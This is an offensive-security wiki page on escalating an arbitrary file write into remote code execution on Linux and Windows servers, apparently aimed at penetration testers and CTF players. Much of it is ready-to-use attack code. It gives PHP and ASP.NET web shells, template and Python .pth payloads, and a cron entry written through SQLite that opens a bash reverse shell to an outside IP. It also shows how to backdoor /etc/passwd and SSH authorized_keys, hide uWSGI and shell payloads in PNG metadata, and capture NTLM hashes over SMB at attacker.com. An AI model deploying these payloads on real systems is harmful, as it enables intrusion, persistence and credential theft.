---
description: >-
  Being able to create or overwrite files on a server, often causing Remote Code
  Execution (RCE)
---

# Arbitrary File Write

Using techniques similar to [local-file-disclosure.md](local-file-disclosure.md "mention"), it may be possible to write files at arbitrary locations on a system. An easy way to confirm if this is the case in a blind scenario is to try to write a file to special locations and observe any errors or responses:

* `/tmp` should always work because every user has all permissions here
* `/root` likely won't work if you are not the `root` user, and may result in "Permission denied"
* `/nonexistant` or any random name may give an error saying the directory wasn't found

Then, depending on the system, you need to decide what file to create or overwrite. Many ways exist to obtain Remote Code Execution but there often isn't one silver bullet that always works, so this requires some experimenting and knowledge of the server's backend.

This page collects some known ways to achieve RCE or other privileged access on the server. When a method does not require completely controlling the full content of the file, it is considered a 'partial'  write because random data may come before or after it. These are **even more powerful**.

## Overwriting Code

One simple and often consistent way to execute arbitrary commands is to write your own code in a file that the server executes. This may be direct source code or other files that include code like templates which will be executed.

### Source Code

Writing source code can go in multiple ways. If the directory where you are writing files to, like `/uploads/`, already allows executing files with the correct extension as source code, you can just upload it here and execute it once you visit the location. Most often, however, these directories are protected from code execution and you have to find a place where the original source code of the web application lives, as these will always be executable. See [#source-code](local-file-disclosure.md#source-code "mention") for some common locations.

{% hint style="info" %}
**Note**: Even if you overwrite source code, it might not be directly executed when you visit the page because it is compiled and won't be reloaded until the server is restarted. You may be able to trigger this by crashing the server, or just be patient until this happens naturally.
{% endhint %}

#### PHP (`.php`, `.php7`, `.phtml`, `.phar`, etc.) - partial

{% code title="shell.php" %}
```php
<?php system($_GET["cmd"]) ?>
```
{% endcode %}

Bypass `<?php` filter with alternative prefixes:

<pre class="language-php"><code class="lang-php"><strong>&#x3C;?= system($_GET["cmd"]) ?>  // Universal (echo's result automatically)
</strong>
<strong>&#x3C;?system($_GET["cmd"])?>  // Supported on some servers
</strong>
<strong>&#x3C;script language="php">system($_GET["cmd"])&#x3C;/script>  // PHP &#x3C; 7
</strong></code></pre>

<pre class="language-php" data-title="Shortest (14-15 bytes)"><code class="lang-php">// Execute with /shell.php?0=id
<strong>&#x3C;?=`$_GET[0]`;
</strong>
<strong>&#x3C;?=`$_GET[0]`?>ANYTHING
</strong></code></pre>

#### Python (`.py`, `.pyc`)

{% code title="shell.py" %}
```python
__import__("os").system("id > /tmp/pwned")
```
{% endcode %}

You can also create a compiled `.pyc` file which can be executed just like any other source code file:

```bash
python3 -c '__import__("py_compile").compile("shell.py", "shell.pyc")'
```

In case you can't _ove&#x72;_&#x77;rite a file, you may still be able to write next to it. If you are able to restart the application or trigger dynamic imports, you can hijack an `import` statement by naming it the same, such as `json.py` ([example](https://siunam321.github.io/ctf/NahamCon-CTF-2025/Web/Talk-Tuah/#afw-to-rce-via-hijacking-python-importing-module)). The same can be done with .py and .so files as they are also recognized ways of importing a library in Python ([source](https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/)).

#### JavaScript (`.js`, `.mjs`)

{% code title="shell.js" %}
```javascript
require("child_process").execSync("id > /tmp/pwned").toString()
```
{% endcode %}

#### C# ASP.NET (`.asp`, `.aspx`) - partial

{% code title="shell.asp" %}
```aspnet
<!-- Source: https://github.com/tennc/webshell/blob/master/asp/webshell.asp -->
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's local address:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
</HTML>
```
{% endcode %}

{% code title="shell.aspx" %}
```html
<!-- Source: https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx -->
<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">      
Sub RunCmd(Src As Object, E As EventArgs)            
  Dim myProcess As New Process()            
  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
  myProcessStartInfo.UseShellExecute = false            
  myProcessStartInfo.RedirectStandardOutput = true            
  myProcess.StartInfo = myProcessStartInfo            
  myProcessStartInfo.Arguments=xcmd.text            
  myProcess.Start()            

  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
  Dim myString As String = myStreamReader.Readtoend()            
  myProcess.Close()            
  mystring=replace(mystring,"<","&lt;")            
  mystring=replace(mystring,">","&gt;")            
  result.text= vbcrlf & "<pre>" & mystring & "</pre>"    
End Sub
</script>

<html>
<body>    
<form runat="server">        
<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>        
<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>        
<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        
<p><asp:Label id="result" runat="server"></asp:Label>       
</form>
</body>
</html>
```
{% endcode %}

### Libraries

Not only user-created code can be overwritten, sometimes a program does not reload its source code while running. For those situations, another trick that may work is to overwrite libraries that are loaded. If you have permissions to overwrite a Python `.py` file inside the packages folder, or can overwrite a JAR file for Java applications, it could grant code execution again.

Specific to Python, one trick [shared in this article](https://www.sonarsource.com/blog/pretalx-vulnerabilities-how-to-get-accepted-at-every-conference/) involves a `.pth` file stored in `~/.local/lib/pythonX.Y/site-packages`. These files are automatically parsed when starting a new Python process to load the package paths, but has one interesting behavior that we can exploit:

```python
...
if line.startswith(("import ", "import\t")):
    exec(line)
```

The above shows that if any line starts with `import` , that whole line is executed. By using `;` semicolons we can add arbitrary statements to this single line and execute any code we like:

{% code title="~/.local/lib/pythonX.Y/site-packages/anything.pth" %}
```python
ANYTHING
import os; os.system("id > /tmp/pwned")
ANYTHING
```
{% endcode %}

The above will execute when the correct Python version is launched even when the "ANYTHING" part is invalid syntax, it only needs to be valid UTF-8.

### Templates (partial)

If source code is not writable or isn't reloaded, another simple method is overwriting templates that can execute code. There are many different templating engines that all use their own syntax and context, some more restricted than others. But most of them have ways to execute arbitrary code or at least read some secrets. Read the full Server-Side Template Injection page to see if your case fits:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#exploits" %}
List of exploits for templating languages
{% endembed %}

Here are a few easy examples:

{% code title="shell.html (Jinja2)" %}
```django
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
{% endcode %}

{% code title="shell.html (Nunjucks)" %}
```javascript
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}
```
{% endcode %}

{% code title="shell.ejs (EJS)" %}
```javascript
<%= process.mainModule.require("child_process").execSync("id").toString() %>
```
{% endcode %}

### Shellcode to memory (requires seek)

If you are not only able to write to a file, but also seek into the file to a specific spot to start writing, you can overwrite memory instructions with [shellcode.md](../../binary-exploitation/shellcode.md "mention") to achieve RCE. The `/proc/self/mem` file exposes the process' memory raw allowing you to read and write by seeking to a memory address.\
With ASLR, the offset of memory addresses is random on modern systems. But if you also have a way to read files, the `/proc/self/maps` file contains a nicely formatted list of all sections and their offsets:

{% code title="/proc/$PID/maps" %}
```clike
55964f749000-55964f74b000 r--p 00000000 08:40 439256    /usr/bin/cat
...
55964f753000-55964f754000 rw-p 00009000 08:40 439256    /usr/bin/cat
559670cec000-559670d0d000 rw-p 00000000 00:00 0         [heap]
7f0d2016e000-7f0d20193000 rw-p 00000000 00:00 0
7f0d20193000-7f0d201bb000 r--p 00000000 08:40 442102    /usr/lib/x86_64-linux-gnu/libc.so.6
...
7f0d20396000-7f0d20398000 rw-p 00202000 08:40 442102    /usr/lib/x86_64-linux-gnu/libc.so.6
7f0d203a9000-7f0d203aa000 r--p 00000000 08:40 442082    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
...
7f0d203e1000-7f0d203e3000 rw-p 00038000 08:40 442082    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fff1b1d8000-7fff1b1f9000 rw-p 00000000 00:00 0         [stack]
7fff1b1fa000-7fff1b1fe000 r--p 00000000 00:00 0         [vvar]
7fff1b1fe000-7fff1b200000 r-xp 00000000 00:00 0         [vdso]
```
{% endcode %}

In here, we can find the address where `libc` is loaded. A common attack now is to download the libc of the remote target with a file read vulnerability (or guess it), then overwrite some commonly used function's instructions with our shellcode.

{% embed url="https://brycec.me/posts/dicectf_2022_writeups#denoblog" %}
denoblog writeup explaining deno sandbox bypass using /proc/self/mem
{% endembed %}

## Configuration Files

If you cannot directly write or execute source code, the configuration of an application or server can often also have large exploitable areas. You may be able to set shell commands directly in here, or change the configuration in some way to aid another method.

### `.ssh/authorized_keys` (partial)

When SSH is set up on a server, every shell user can have an `.ssh/` directory inside their home directory containing their public and private key, as well as an `authorized_keys` file that contains all the **public keys** allowed to log in as this user, **separated by newlines**.&#x20;

When you have access to SSH port 22 on a server, this is often a very clean way to execute code as the target user. You can grab your own public key from `~/.ssh/id_rsa.pub` or generate one with `ssh-keygen` if you haven't already, then write its contents to the `/home/$USER/.ssh/authorized_keys` file on the server and log in:

{% code title="~/.ssh/authorized_keys" %}
```
ssh-rsa AAAA...wzE=
```
{% endcode %}

```bash
ssh $USER@$IP
```

{% hint style="warning" %}
Default installations of SSH don't allow logging in as `root`. To check this look at the `PermitRootLogin` option in `/etc/ssh/sshd_config`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ grep PermitRootLogin /etc/ssh/sshd_config
</strong>PermitRootLogin yes
</code></pre>
{% endhint %}

SSH only splits this file by `\n` newline characters and parse all sections as possible public keys. That means a partial write where random data is before and/or after our payload is possible to exploit by adding newlines before and after our public key. Create a valid PNG that is also a backdoored `authorized_keys` file, for example:

```bash
exiftool -Comment=$'\nssh-rsa AAAA...wzE=\n' example.png
```

If the image is transformed in some way, metadata comments like these may not survive. We can still put our raw data into a BMP file because it isn't compressed (see [#writing-image-files-using-write](imagemagick.md#writing-image-files-using-write "mention")).

### Apache `.htaccess`

When uploading files, rules are often set on the upload directory to prevent `.php` files from executing, or these extensions are simply blocked by a filter. In such cases, a file named `.htaccess` could configure an Apache server to change the behavior of a directory.&#x20;

The main idea is to add another file extension that you _are_ allowed to upload to be able to execute PHP code, and you can even specify an encoding like UTF-7 to bypass filters. See the following writeup for an example of exploiting this from start to finish:

{% embed url="https://jorianwoltjer.com/blog/p/ctf/challenge-the-cyber-2022/file-upload-training-mission" %}
Writeup of challenge that blocks any PHP extension or `<?` string
{% endembed %}

<pre class="language-apacheconf" data-title=".htaccess"><code class="lang-apacheconf"><strong># Allow .asp files to be served as PHP
</strong>AddType application/x-httpd-php .asp
<strong># Set the encoding to UTF-7
</strong>php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
</code></pre>

{% code title="shell.asp" %}
```
+ADw-?php+ACA-system(+ACQ-+AF8-GET+AFs-+ACI-cmd+ACI-+AF0-)+ACA-?+AD4-
```
{% endcode %}

The repository below shows some more techniques using `.htaccess` file to get RCE:

{% embed url="https://github.com/wireghoul/htshells" %}
Repository containing various tricks to get RCE using .htaccess files alone
{% endembed %}

### uWSGI magic variables (partial)

{% embed url="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html" %}
Overwriting `uwsgi.ini` files containing syntax to execute shell commands
{% endembed %}

Using the `@()` syntax, you can define uWSGI configuration anywhere in a file that executes system commands when loaded. Similar to the authorized keys, this can be put into PNG metadata, for example, which will include it in a valid PNG image:

```bash
exiftool -Comment=$'\n[uwsgi]\nfoo = @(exec://id > /tmp/pwned)\n' example.png
```

Payloads can be locally tested using the following command:

```bash
uwsgi --ini example.png
```

When written to the server, it may take some time before the payload is executed. If the server is configured to auto-reload using the `py-auto-reload =` configuration variable it may happen automatically, but otherwise, you need to either force a restart by crashing the application or just wait until a server admin does it for you.

### Environment and Settings

Overwriting the settings of an application can have a significant effect on security. As the above showed, there are often many sensitive options and you just have to find them in the documentation or with some educated guessing.&#x20;

One example is the `.env` file which often replaces environment variables for an application. If a [flask.md](../frameworks/flask.md "mention") webserver uses this file to get its `SECRET_KEY` variable, for example, you will be able to forge any session as explained in [#forging-session](../frameworks/flask.md#forging-session "mention") with your known key.

Some formats like [yaml.md](../../languages/yaml.md "mention") may even be so complex that they allow arbitrary instantiation of classes, resulting in Insecure Deserialization. Keep this in mind when evaluating overwriting such a config file, that you don't necessarily need to exploit an option if you can exploit the format itself.

### Database/storage files

Some databases like [SQLite](https://www.sqlite.org/) store all their data in local files. While this makes it simple, it also allows you to overwrite these files with any data of your choice. Suddenly, you control every bit of data, expanding the attack surface greatly as developers might not expect some generated data to be user-controlled.&#x20;

One common example is through [#deserialization](arbitrary-file-write.md#deserialization "mention") exploits like session data. Other applications might also store custom bits of data that are included in shell commands. After locally creating the same database structure with your injected data, write the file to the location. Often a reload is not required as databases change all the time, so it should instantly have an effect.

### root `/etc/passwd`

The root user may edit `/etc/passwd` to add another root-level user with your own password. Then you can log in as that user and get root privileges:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ openssl passwd 'hacker'  # Generate password
</strong>aQeFa8LxllpT.
</code></pre>

Then if you somehow append the following line to the `/etc/passwd` file, you will be able to log in as root using the password "hacker":

<pre class="language-shell"><code class="lang-shell">root:x:0:0:root:/root:/bin/bash
...
<strong>hacker:aQeFa8LxllpT.:0:0:root:/root:/bin/bash
</strong></code></pre>

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ssh hacker@$IP
</strong>Password: hacker
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

### Google Chrome

Google Chrome or Chromium configures all settings via files in the _Profile Path_ (found in `about:version`). The `Preferences` file specifically contains many properties. The easiest way to find their meaning is diffing the file before and after changing the option in the settings GUI.

In this writeup the `session.startup_urls` was used to open a malicious URL on startup, and with `download.default_directory` it was possible to drive-by download a file into any directory to elevate a limited file write to a full one:

{% embed url="https://jorianwoltjer.com/blog/p/ctf/intigriti-xss-challenge/0625#arbitrary-file-write" %}

The intended solution for that challenge was to write a malicious entry into the Disk Cache on another site, which would enable XSS.

{% embed url="https://tog.re/writeup/intigriti_june_2025/#-understanding-of-chrome-cache" %}

If extensions are enabled (often disabled by headless browsers), you can install an extension on the user by creating/modifying the required files. Below is a writeup detailing how it can be used for malware purposes:

{% embed url="https://www.synacktiv.com/en/publications/the-phantom-extension-backdooring-chrome-through-uncharted-pathways" %}

If the `--disable-component-update` flag is not set (often set by headless browsers), there exists a file in the data directory at `_platform_specific/linux_x64/libwidevinecdm.so` which is loaded as a shared object ([more info here](../../linux/linux-privilege-escalation/command-exploitation.md#usdld_preload-and-usdld_library_path)). It doesn't require special file permissions and will be executed as real shellcode.

{% embed url="https://worty.fr/post/writeups/heroctfv7/evil_cloner/" %}

## Shell Scripts

Shell scripts inherently execute shell commands, often being the end goal of exploiting an arbitrary file write vulnerability. Therefore, they should be large targets and are often easy to exploit.&#x20;

Some scripts execute on a schedule to automatically exploit, others are triggered by some action on the application or server, and you could even backdoor profile scripts that run when an admin interactively logs in.&#x20;

### Cron Jobs (partial)

[Cron Jobs](https://en.wikipedia.org/wiki/Cron) are scheduled tasks on a Linux system that are automatically triggered by the daemon. Here, you can create a file that executes every minute, for example. The next time this minute is triggered your payload will execute. The syntax for such a file looks something like this:

{% code title="Cron syntax" %}
```bash
# m h dom mon dow command
* * * * * id > /tmp/pwned
```
{% endcode %}

There are multiple places for such files, but often these are only writable by the `root` user.

* `/etc/crontab`: Cron syntax for global use by any user.
* `/etc/cron.d`: Directory containing files with cron syntax often separated per application.
* `/var/spool/cron/crontabs/$USER`: File per user with cron syntax, often edited manually with `crontab -e`. The filename is the username it executes as.
* `/etc/cron.hourly`, `.daily`, etc.: Bash scripts that cron will also execute every hour, day, week or month. These may be dirty too as they are only bash scripts and don't require special syntax.

This file is again simply a newline-separated list of commands. If you are able to write any clean line cron will find the job and execute it at the given time. In **SQLite**, for example ([source](https://kiddo-pwn.github.io/blog/2025-11-30/writing-sync-popping-cron#solution-fault-tolerant-crontab)):

```sql
ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;
CREATE TABLE cron.tab (dataz text);
INSERT INTO cron.tab (dataz) VALUES ('
* * * * * root bash -i >& /dev/tcp/1.3.3.7/1337 0>&1
');
```

{% code title="/etc/cron.d/pwn.task" %}
```bash
��8ytabletabtabCREATE TABLE tab (dataz text)
* * * * * root bash -i >& /dev/tcp/1.3.3.7/1337 0>&1
```
{% endcode %}

### Bash Profile (partial)

Another way is creating a **backdoor** in the user's home directory. For Bash, the `~/.bashrc` file is most common as it executes in any non-login interactive shell. However, for login shells like SSH, a few more are executed in the following order. The _first_ readable file is the _only_ one that executes:

1. `~/.bash_profile`
2. `~/.bash_login`
3. `~/.profile`

Often the above files execute `~/.bashrc` as well to make sure login shells work similarly to non-login ones, so this is often your best bet. Here is a table that shows what Bash by itself:

<table><thead><tr><th width="330.3333333333333">Command</th><th width="191">Execute ~/.bashrc?</th><th>Execute ~/.bash_profile?</th></tr></thead><tbody><tr><td><code>bash -c [command]</code></td><td><mark style="color:red;"><strong>NO</strong></mark></td><td><mark style="color:red;"><strong>NO</strong></mark></td></tr><tr><td><code>bash [command]</code></td><td><mark style="color:red;"><strong>NO</strong></mark></td><td><mark style="color:red;"><strong>NO</strong></mark></td></tr><tr><td><code>echo [command] | bash</code></td><td><mark style="color:red;"><strong>NO</strong></mark></td><td><mark style="color:red;"><strong>NO</strong></mark></td></tr><tr><td><code>[command]</code></td><td><mark style="color:red;"><strong>NO</strong></mark></td><td><mark style="color:red;"><strong>NO</strong></mark></td></tr><tr><td><code>ssh ... [command]</code></td><td><mark style="color:green;"><strong>YES</strong></mark></td><td><mark style="color:green;"><strong>YES</strong></mark></td></tr><tr><td><code>login</code>, <code>bash -l</code></td><td><mark style="color:red;"><strong>NO</strong></mark></td><td><mark style="color:green;"><strong>YES</strong></mark></td></tr><tr><td><code>bash</code></td><td><mark style="color:green;"><strong>YES</strong></mark></td><td><mark style="color:red;"><strong>NO</strong></mark></td></tr></tbody></table>

See [this article](https://www.baeldung.com/linux/bashrc-vs-bash-profile-vs-profile) to get a full understanding, as well as the [source code](https://github.com/bminor/bash/blob/ec8113b9861375e4e17b3307372569d429dec814/shell.c#L1123-L1260).&#x20;

As this only requires writing a bash script at the location, it may include any other garbage data before/after your payload if only it is separated by newlines. Bash will ignore syntax errors and keep executing commands until it exits or the end of the file is reached:

<pre class="language-bash"><code class="lang-bash"><strong>exiftool -Comment=$'\nid > /tmp/pwned\n' example.png
</strong># test it locally:
bash example.png
</code></pre>

### Sending Input

_Piped commands_ in Linux work by simply starting all given programs at the same time, and chaining their input and output streams together. The following command, for example, will connect `sleep`'s 1 (STDOUT) with `sh`'s 0 (STDIN):

```bash
sleep 999999 | sh
```

<pre class="language-shell-session" data-title="In another terminal"><code class="lang-shell-session"><strong>$ ls -l /proc/$(pidof sleep)/fd
</strong>lrwx------ 1 user user 0 -> /dev/pts/0
<strong>l-wx------ 1 user user 1 -> 'pipe:[22221]'
</strong>lrwx------ 1 user user 2 -> /dev/pts/0
<strong>$ ls -l /proc/$(pidof sh)/fd
</strong><strong>lr-x------ 1 user user 0 -> 'pipe:[22221]'
</strong>lrwx------ 1 user user 1 -> /dev/pts/0
lrwx------ 1 user user 2 -> /dev/pts/0
</code></pre>

With an arbitrary file write vulnerability, you can write to this pipe! This allows you to send input through to the receiving end of the pipe, which may process it insecurely. In this case of `sh`, it will execute any commands received through STDIN:

```bash
echo id > /proc/$(pidof sh)/fd/0
```

<pre class="language-shell-session" data-title="Receiving end"><code class="lang-shell-session">$ sleep 999999 | sh
<strong>uid=1000(user) gid=1000(user) groups=1000(user)
</strong></code></pre>

Apart from pipes, this same idea applies to opened **sockets**. Some programs will open sockets for communication between each other, but you can write to this too. If the receiving end handles these insecurely you may be able to execute code similar to what's shown above.

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ls -l /proc/$(pidof node)/fd
</strong>lrwx------ 1 root root 64 Mar 11 19:46 0 -> /dev/null
l-wx------ 1 root root 64 Mar 11 19:46 1 -> 'pipe:[78136]'
lr-x------ 1 root root 64 Mar 11 19:46 10 -> 'pipe:[75187]'
l-wx------ 1 root root 64 Mar 11 19:46 11 -> 'pipe:[75187]'
lrwx------ 1 root root 64 Mar 11 19:46 12 -> 'anon_inode:[eventfd]'
lrwx------ 1 root root 64 Mar 11 19:46 13 -> 'anon_inode:[eventpoll]'
lr-x------ 1 root root 64 Mar 11 19:46 14 -> 'pipe:[81949]'
<strong>l-wx------ 1 root root 64 Mar 11 19:46 15 -> 'pipe:[81949]'
</strong>lrwx------ 1 root root 64 Mar 11 19:46 16 -> 'anon_inode:[eventfd]'
</code></pre>

Specifically, you often see binary protocols used in these sockets. In the case of NodeJS, it uses a library named _libuv_ to which it will send structs containing function pointers. If you're familiar with Binary Exploitation, you'll know that this sounds like a recipe for jumping around the binary to unintended locations, and with the disabled protections by default and control over the stack, this becomes consistently exploitable.

This idea was [first found by Seunghyun Lee](https://hackerone.com/reports/2260337), and later publicized in ["Sonar Research: Why Code Security Matters - Even in Hardened Environments"](https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/). This adds the restriction of the file write being valid UTF-8, requiring all [return-oriented-programming-rop](../../binary-exploitation/return-oriented-programming-rop/ "mention") gadget's addresses to be so as well. This makes it possible to get RCE from an Arbitrary File Write vulnerability on a read-only filesystem!

{% embed url="https://github.com/JorianWoltjer/nodejs-file-write-rce" %}
PoC of NodeJS RCE using ropchain in libuv
{% endembed %}

## Deserialization

Many programming languages have ways of serializing and deserializing complex classes into bytes and back. This can sometimes be dangerous when arbitrary classes can be instantiated, called 'Insecure Deserialization'. The level of complexity varies a lot depending on the programming language and library used. Python[#pickle-deserialization](../../languages/python.md#pickle-deserialization "mention") is very easy, for example, while PHP or Java often require gadgets in well-known libraries.

Common places to find such data are session files, as these often map a session ID to an object with all properties of a user. If you can overwrite these you may be able to invoke an Insecure Deserialization the next time you use that session ID and the application tries to load its data.&#x20;

In PHP, these are stored by default in the `/var/lib/php/sessions/` directory with names like `sess_[PHPSESSID]` where your `PHPSESSID` cookie is inserted into the path. That means you can write a file like `/var/lib/php/sessions/sess_exploit` with a malicious serialized payload, and when you visit the page with a `PHPSESSID=exploit` cookie you will trigger the deserialization payload when `session_start();` is called.

Here's an example where we set the `x` property of `$_SESSION` to a custom deserialization gadget:

{% code title="Example PHP gadget" %}
```php
class Gadget
{
    public $command;
    function __construct() {}
    function __wakeup() {
        if (isset($this->command)) {
            system($this->command);
        }
    }
}
```
{% endcode %}

{% code title="sess_exploit" %}
```php
x|O:6:"Gadget":1:{s:7:"command";s:15:"id > /tmp/pwned";}
```
{% endcode %}

## Windows

In the above chapters I talked about Linux a lot, because it's the most common for servers. But you may find a file write vulnerability in a client-side application. In that case Windows is still the most popular, so a good exploit should work on there.

Firstly, keep in mind that Windows handles paths differently than Linux. For one, **forward- and backslashes can be used interchangeably** potentially allowing some filter bypasses.\
If you're targeting a filename with a random suffix, you can also make use of **8.3 filenames**:

{% embed url="https://tomgalvin.uk/blog/gen/2015/06/09/filenames/" %}
Exploration of 8.3 filenames and their edge cases
{% endembed %}

Use the `dir /x` command to view these shortened filenames in a directory, for example:

<pre class="language-powershell"><code class="lang-powershell">C:\Windows\Tasks> echo test > some-super-long-filename.txt
C:\Windows\Tasks> dir /x
...
<strong>00-00-2025  00:00                 8 SOME-S~1.TXT some-super-long-filename.txt
</strong>C:\Windows\Tasks> type SOME-S~1.TXT
test
</code></pre>

There's also a bunch of rules for path normalization, especially when looking at different drives. Check out the article below to get an idea:

{% embed url="https://www.fileside.app/blog/2023-03-17_windows-file-paths/" %}
Exploring many formats for paths on Windows
{% endembed %}

### Startup Folder with HTA (partial)

One easy place to write a payload that will be executed in the future is the user's startup folder. Every file in here will be opened with the default program when the system starts up. You can quickly navigate to it by pressing Win+R and inputting `shell:startup`. This should bring you to a path like the following:

```
C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

Putting an `.exe` here, for example, will run it once you shut down and start up the system again.

This can be useful for a partial file write using the HTA ([HTML Application](https://en.wikipedia.org/wiki/HTML_Application)) file format. This very flexible format is based on HTML, which means it doesn't error out on strange content. All it looks for is `<script>` tags to execute as [VBScript](https://en.wikipedia.org/wiki/VBScript), to run local system commands.

<pre class="language-html" data-title="payload.hta"><code class="lang-html">&#x3C;script language="VBScript">
  Set shell = CreateObject("wscript.Shell")
<strong>  shell.run "calc"
</strong>  Window.Close
&#x3C;/script>
</code></pre>

The above executes `calc`, but can be replaced with any other malicious payload. See my writeup below for how I used this in an application that generates a BMP image from specifically crafted pixels to form the above payload into the startup folder:

{% embed url="https://jorianwoltjer.com/blog/p/research/obs-websocket-rce" %}
Embedding HTA in the pixels of a BMP image on Windows
{% endembed %}

### Leaking Username

You'll often be attacking a specific _user_ on Windows, as opposed to a "root" user who can do anything. By default, you can only write to your personal folder under `C:\Users\[username]`, and a few globally writable directories outside of that such as `C:\Windows\Temp` or `C:\Windows\Tasks`.

That means for most impactful file writes, you'll need to know the username of the victim to prepare a path that points to their permitted folder. There are a few edge cases where you may not need to fill out the complete username:

* Try **relative paths**, if it starts out in the user's home directory already, you may be able to use a limited set of `../` sequences to perfectly go to the folder you want.
* Check if **environment variables** are resolved. In that case, things like `%USERPROFILE%` point to the current user's home directory.

When you do really need to get the username for an absolute path, there may be other vulnerable functionality in the app that allows you to leak such a username beforehand. Maybe some templating feature where you can extract it from another path that happens to contain it, or something leaking the victim's name that can help guess the path. Get creative.\
Keep in mind that you may be able to brute force the username depending on your vulnerability. If you can rapidly do attempts just go through a wordlist of common names, because Windows will shorten it often to just the person's first name.

As a last option, it could be possible to use an **SMB path** to connect to a remote attacker's server. For authentication purposes, this sends your username to the attacker's server who can then read it, and prepare a working absolute path.\
This is similar to [#forcing-authentication-to-relay](../../windows/exploitation.md#forcing-authentication-to-relay "mention"), because in an active Active Directory environment, such an authentication alone can be enough to take over someone's account by relaying it to another service.\
The path should look something like this:

{% code title="Paths" %}
```
\\attacker.com\share\file.txt

smb://attacker.com/share/file.txt
```
{% endcode %}

An attack can host their server on `attacker.com` with the following command ([`smbserver.py`](https://github.com/fortra/impacket/blob/master/impacket/smbserver.py)):

{% code title="Setup server" %}
```sh
cd $(mktemp -d)
sudo smbserver.py -smb2support -ip 0.0.0.0 share .
```
{% endcode %}

If successful, you can expect terminal output like this:

```powershell
[*] Incoming connection (10.10.10.10,54321)
[*] AUTHENTICATE_MESSAGE (WORKGROUP\LAPTOP$,LAPTOP)
[*] User LAPTOP\User authenticated successfully
[*] LAPTOP$::User:aaaaaaaaaaaaaaaa:000102030405060708090a0b0c0d0e0f:f9f8f7f6f5f4f3f2f1f0efeeedecebeae9e8e7e6e5e4e3e2e1e0dfdedddcdbdad9d8d7d6d5d4d3d2d1d0cfcecdcccbcac9c8c7c6c5c4c3c2c1c0bfbebdbcbbbab9b8b7b6b5b4b3b2b1b0afaeadacabaaa9a8a7a6a5a4a3a2a1a09f9e9d9c9b9a999897969594939291908f8e8d8c8b8a898887868584838281807f7e7d7c7b7a797877767574737271706f6e6d6c6b6a696867666564636261605f5e5d5c5b5a595857565554535251504f4e4d4c4b4a494847464544434241403f3e3d3c3b3a393837363534333231302f2e2d2c2b2a292827262524232221201f1e1d1c1b1a191817161514131211100f0e0d0c0b0a09080706050403020100
```

{% hint style="info" %}
**Note**: This might not word directly, because of Firewalls often denying outbound SMB connections. You can try to simulate it being on the same local Wi-Fi network which could still be a valid attack vector.
{% endhint %}
